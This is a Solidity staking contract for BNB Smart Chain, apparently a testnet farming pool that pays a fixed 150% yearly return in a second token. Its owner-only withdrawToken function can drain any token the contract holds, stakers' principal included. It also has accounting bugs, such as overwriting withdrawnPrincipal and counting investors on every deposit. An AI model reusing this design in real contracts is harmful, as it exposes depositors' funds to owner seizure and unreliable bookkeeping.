/**
 *Submitted for verification at BscScan.com on 2021-07-24
*/

// SPDX-License-Identifier: none
pragma solidity ^0.8.6;

interface IBEP20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}


contract FarmingTestnet {

  struct Tariff {
    uint time;
    uint percent;
  }

 struct Deposit {

    uint256 amount;
    uint256 depositAt;
    uint256 withdrawAt;
    bool principalWithdrawn;
  }
  struct Investor {
    bool registered;  
    uint invested;
    uint withdrawRoi;
    uint withdrawnPrincipal;
    uint userTotalWithdrawn;
    Deposit[] deposits;
  }
  
  uint public totalInvested; 
  uint public totalWithdrawn;
  
  address public owner;
  address public tokenAddr = 0xe666B0bC7B4766e9e26bF4fe5F86683c420a9cEe;
  address public roiTokenAddr = 0x3aA285d84528F03103bA0491a87Eb80b12919cA3;
  address contractAddr = address(this);

  Tariff[] public tariffs;

  uint public totalInvestors;

  mapping (address => Investor) investors;
  mapping (address => Tariff) public tariff;
  
  event DepositAt(address user, uint amount);
  event Withdraw(address user, uint amount);
  event TransferOwnership(address user);
  event Received(address, uint);

    constructor()  {
        tariffs.push(Tariff(365 days, 150));
        owner = msg.sender;
    }
    
    // Stake tokens on the contract
    function deposit(uint tokenAmount) public {
        
        IBEP20 token = IBEP20(tokenAddr);
        require(tokenAmount >= 1000000000000000000, "Minimum Limit Exceed");
        require(token.balanceOf(msg.sender) > 0, "Not enough balance of user");
        token.transferFrom(msg.sender, contractAddr, tokenAmount);
      
        investors[msg.sender].registered = true;
        investors[msg.sender].invested += tokenAmount;
        
        investors[msg.sender].deposits.push(Deposit(tokenAmount, block.timestamp,0,false));    
        totalInvested += tokenAmount;
        totalInvestors++;
    
        emit DepositAt(msg.sender, tokenAmount);
    }
    
  
  
    // WithdrawROI
    function withdrawROI() public {
        
        uint amount;
        address user = msg.sender;
        Investor storage investor = investors[user];
        Tariff storage tariffPlan = tariffs[0]; 
        for (uint256 i = 0; i < investor.deposits.length; i++) {
          Deposit storage dep = investor.deposits[i];

          uint256 finish = dep.depositAt + tariffPlan.time;
    
          uint256 since = dep.withdrawAt > dep.depositAt ? dep.withdrawAt : dep.depositAt;
    
          uint256 till = block.timestamp > finish ? finish : block.timestamp;
         
          if (since < till && dep.principalWithdrawn==false) {
            
            amount += dep.amount * (till - since) * tariffPlan.percent / tariffPlan.time / 100;
            investor.deposits[i].withdrawAt = block.timestamp;
          }
        }
        
        investor.withdrawRoi += amount;
        investor.userTotalWithdrawn += amount;
        
        IBEP20 token = IBEP20(roiTokenAddr);

        token.transfer(user, amount);
        
        totalWithdrawn += amount;

        emit Withdraw(user, amount);
    }
  
    // Principal withdraw wtih ROI(if any left)
    function principalWithdraw(uint depositIndex) public {
        
        uint principalAmount;
        uint roiAmount;
        address user = msg.sender;
        Investor storage investor = investors[user];
        Tariff storage tariffPlan = tariffs[0]; 
       
          Deposit storage dep = investor.deposits[depositIndex];

          uint256 finish = dep.depositAt + tariffPlan.time;
    
          uint256 since = dep.withdrawAt > dep.depositAt ? dep.withdrawAt : dep.depositAt;
    
          uint256 till = block.timestamp > finish ? finish : block.timestamp;
         
          if (since < till && dep.principalWithdrawn==false) {
            principalAmount = dep.amount;
            roiAmount = dep.amount * (till - since) * tariffPlan.percent / tariffPlan.time / 100;
            investor.deposits[depositIndex].withdrawAt = block.timestamp;
            investor.deposits[depositIndex].principalWithdrawn = true;
          }
        
        
        uint amount = principalAmount+roiAmount;
        
        investor.withdrawRoi += roiAmount;
        investor.withdrawnPrincipal = principalAmount;
        investor.userTotalWithdrawn += amount;
        
        IBEP20 roiToken = IBEP20(roiTokenAddr);
        roiToken.transfer(user, roiAmount);
        
        IBEP20 token = IBEP20(tokenAddr);
        token.transfer(user, principalAmount);
        
        totalWithdrawn += amount;
       
       emit Withdraw(msg.sender, amount);
    }
  
     // View withdrawable ROI
    function withdrawableView(address user) public view returns (uint amount) {
        Investor storage investor = investors[user];
          
        Tariff storage tariffPlan = tariffs[0]; 
        for (uint256 i = 0; i < investor.deposits.length; i++) {
          Deposit storage dep = investor.deposits[i];

          uint256 finish = dep.depositAt + tariffPlan.time;
    
          uint256 since = dep.withdrawAt > dep.depositAt ? dep.withdrawAt : dep.depositAt;
    
          uint256 till = block.timestamp > finish ? finish : block.timestamp;
         
          if (since < till && dep.principalWithdrawn==false) {
            
            amount += dep.amount * (till - since) * tariffPlan.percent / tariffPlan.time / 100;
          }
        }
            
       
    }   
    
    
     function chcekTimestamp() public view returns (uint timestamp) {
        timestamp = block.timestamp;
         
     }
     function userDeposits(address user) public view returns (uint[] memory,uint[] memory,uint[] memory, bool[] memory) {
        Investor storage investor = investors[user]; 
        uint depositsLength = investor.deposits.length;
        uint[] memory amount = new uint[](depositsLength);
        uint[] memory depositAt = new uint[](depositsLength);
        uint[] memory withdrawAt = new uint[](depositsLength);
        bool[] memory principalWithdrawn = new bool[](depositsLength);
        
        
        for(uint i = 0; i < depositsLength; i++) {
            Deposit storage dep = investor.deposits[i];
            amount[i] = dep.amount;
            depositAt[i] = dep.depositAt;
            withdrawAt[i] = dep.withdrawAt;
            principalWithdrawn[i] = dep.principalWithdrawn;
        }
        return(amount, depositAt, withdrawAt,principalWithdrawn);
    }
  
    // View user details
    function myData(address userAddr) public view returns (uint invested, uint withdrawnRoi, uint withdrawnPrincipal, uint userTotalWithdrawn) {
        Investor storage investor = investors[userAddr];
        invested = investor.invested;
        withdrawnRoi = investor.withdrawRoi;
        withdrawnPrincipal = investor.withdrawnPrincipal;
        userTotalWithdrawn = investor.userTotalWithdrawn;
        
        return (invested, withdrawnRoi, withdrawnPrincipal,userTotalWithdrawn);
    }
    
    // Owner only token withdraw
    function withdrawToken(address tokenAddress, address to, uint amount) public {
        require(msg.sender == owner, "Only owner");
        IBEP20 token = IBEP20(tokenAddress);
        token.transfer(to, amount);
    }  
    
    // Owner only BNB withdraw
    function withdrawBNB(address payable to, uint amount) public {
        require(msg.sender == owner, "Only owner");
        to.transfer(amount);
    }
  
    // Transfer ownership. Only owner can call this
    function transferOwnership(address to) public {
        require(msg.sender == owner, "Only owner");
        owner = to;
        emit TransferOwnership(owner);
    }
    
    // Receive BNB function
    receive() external payable {
        emit Received(msg.sender, msg.value);
    }  
    
}